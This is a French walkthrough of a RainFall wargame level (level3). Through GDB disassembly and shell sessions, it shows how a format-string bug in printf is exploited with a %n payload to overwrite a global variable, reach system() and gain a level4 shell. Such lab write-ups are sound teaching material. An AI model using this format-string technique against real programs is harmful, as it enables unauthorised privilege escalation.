En lançant GDB on s'appercoit que dans la fonction v appelé par le main il y a un fgets et que l'on ne pourra pas faire de buffer overflow car fgets controle le nombre de caractères lu.

```gdb
0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
```

Neanmoins, on voit que printf (et toutes les fonctions de cette familles) est vulnerables aux failles de Format de string et notement aux %n car ce que l'on ecrit avec fgets et passé directement a printf qui fait office de la chaine de format de printf.

```gdb
0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
0x080484cc <+40>:	lea    eax,[ebp-0x208]
0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
0x080484d5 <+49>:	call   0x8048390 <printf@plt>
```

Pour atteindre la fonction system on doit passé une verification.
```gdb
0x080484d5 <+49>:	call   0x8048390 <printf@plt>
0x080484da <+54>:	mov    eax,ds:0x804988c
0x080484df <+59>:	cmp    eax,0x40
0x080484e2 <+62>:	jne    0x8048518 <v+116>
0x080484e4 <+64>:	mov    eax,ds:0x8049880
0x080484e9 <+69>:	mov    edx,eax
0x080484eb <+71>:	mov    eax,0x8048600
0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx
0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc
0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1
0x08048504 <+96>:	mov    DWORD PTR [esp],eax
0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d
0x08048513 <+111>:	call   0x80483c0 <system@plt>
```

On tatonne jusqu'a trouver le bon offset a passer a %n pour la modification
```bash
level3@RainFall:~$ python -c "print('\x8c\x98\x04\x08 %x %x %x %x')" > /tmp/exploit3
level3@RainFall:~$ cat /tmp/exploit3 | ./level3
� 200 b7fd1ac0 b7ff37d0 804988c
```
On doit bien lui passer 4 pour atteindre la variables a modifier pour passer la verification.
```bash
level3@RainFall:~$ python -c "print('\x8c\x98\x04\x08' + 'B' * 60 + '%4\$n')" > /tmp/exploit3
level3@RainFall:~$ cat /tmp/exploit3
�BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB%4$n
level3@RainFall:~$ cat /tmp/exploit3 - | ./level3
�BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Wait what?!
id
uid=2022(level3) gid=2022(level3) euid=2025(level4) egid=100(users) groups=2025(level4),100(users),2022(level3)
```
